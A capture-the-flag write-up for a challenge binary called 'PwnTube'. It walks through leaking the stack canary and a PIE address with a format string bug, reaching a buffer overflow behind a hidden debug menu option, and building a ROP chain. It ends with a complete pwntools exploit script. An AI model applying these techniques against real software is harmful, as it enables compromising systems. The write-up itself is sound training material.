This executable attempts to mimic the layout of YouTube, showcasing a video titled "How to get the flag".
Unfortunately we cannot see the video because of an unskippable ad, featuring Rick Astley.

We are dealing with a 64 bit ELF executable, with PIE, Partial RELRO, NX enabled and canary.

The vulnerabilities in this binary are very easy to find and they are essentially two:
  - A format string vulnerability
  - A buffer overflow vulnerability

The format string vulnerability is in the showComments() function, that prints every comment in a unsafe way:

                                      for (int i=0; i < n_comments; i++){
                                                  printf(comments[i]);
                                              }

We can exploit this vulnerability to leak both the canary and a PIE address, since the program allow us to add exacly two comments.

To easily interact with the executable i wrote a few helper functions:

                                      def menu_choice(r, choice):
                                          r.sendline(str(choice).encode())
                                      
                                      def get_nth_comment(r, n_comment):
                                          menu_choice(r, 3)
                                          r.recvuntil(b'Comments')
                                          r.recvlines(2)
                                          comments = r.recvuntil(b'1. Play').split(b'\n')[:-2]
                                      
                                          return comments[n_comment-1]
                                      
                                      def add_comment(r, comment):
                                          menu_choice(r, 4)
                                          r.sendline(comment)
                                      
                                      def buy_premium(r, name, card_number):
                                          menu_choice(r, 5)
                                          menu_choice(r, 2)
                                      
                                          r.recvuntil(b'name:')
                                          r.sendline(name)
                                          r.recvuntil(b'number:')
                                          r.sendline(card_number)


After playing with the executable and debugging it with gdb i found that we can leak the canary with the comment "71$p" and the address of the main function with "%55$p", so i added this comments:

                                      add_comment(r, b'%71$p')
                                      add_comment(r, b'%55$p')
                                      canary = int(get_nth_comment(r,9), 16)
                                      leak_main = int(get_nth_comment(r,10), 16)

Easy peasy, now we have the canary and we can also compute the base address: 

                                      exe.address = leak_main - exe.sym['main']

We move on to the second phase of the attack, that consists of exploiting the buffer overflow that's inside the buy_premium() function:

                                      printf("Insert your name:\n");
                                      
                                      scanf("%s", name);

To access this function, we have to enable the "debug mode" by sending the number 777 in the main menu.

                                      case 5:
                                          if(debug){
                                              buy_premium();
                                          }
                                          else{
                                              printf("Sorry, this functionality is under maintenance :)");
                                          }   
                                          break;
                                      case 777:
                                          debug = !debug;
                                          break;

Our goal at this point is to call the function skipAd() and passing the values 0xdeadbeef and 0xfeedface.
We can achieve this by exploiting the BOF in the scanf and by using the following gadget:
                        
                              0x00000000000015a8: pop rdi; pop rsi; pop rdi; ret; 

Our final payload is going to look like this:
        
                                        payload = flat(
                                                b'A' * offset,
                                                canary,
                                                rop.ret.address,
                                                rop.ret.address,
                                                gadget,
                                                0, # junk value
                                                0xfeedface, # rsi
                                                0xdeadbeef, # rdi
                                                rop.ret.address,
                                                rop.ret.address,
                                                exe.sym['skipAd']
                                            )

And here's the full exploit:

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./PwnTube")

context.binary = exe
remote_address = 'localhost'
port = 1337


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        # GDB code 
        r = gdb.debug(exe.path, '''
        
        
        ''')
    else:
        r = remote(remote_address, port)

    return r

def menu_choice(r, choice):
    r.sendline(str(choice).encode())

def get_nth_comment(r, n_comment):
    menu_choice(r, 3)
    r.recvuntil(b'Comments')
    r.recvlines(2)
    comments = r.recvuntil(b'1. Play').split(b'\n')[:-2]

    return comments[n_comment-1]

def add_comment(r, comment):
    menu_choice(r, 4)
    r.sendline(comment)

def buy_premium(r, name, card_number):
    menu_choice(r, 5)
    menu_choice(r, 2)

    r.recvuntil(b'name:')
    r.sendline(name)
    r.recvuntil(b'number:')
    r.sendline(card_number)

def main():
    
    r = conn()

    # Init ROP
    add_comment(r, b'%71$p')
    add_comment(r, b'%55$p')
    canary = int(get_nth_comment(r,9), 16)
    leak_main = int(get_nth_comment(r,10), 16)

    menu_choice(r, 777)

    exe.address = leak_main - exe.sym['main']
    rop = ROP(exe)

    # Set offset
    offset = 0x200 - 8

    gadget = 0x15a8+exe.address

    payload = flat(
        b'A' * offset,
        canary,
        rop.ret.address,
        rop.ret.address,
        gadget,
        0,
        0xfeedface,
        0xdeadbeef,
        rop.ret.address,
        rop.ret.address,
        exe.sym['skipAd']
    )


    buy_premium(r, payload, b'srdnlen')
    
    flag = r.recvrepeat(7).split(b'\n')[-2].decode()
    
    print(flag)

    r.close()
    
    


if __name__ == "__main__":
    main()
```
                                        
                                        
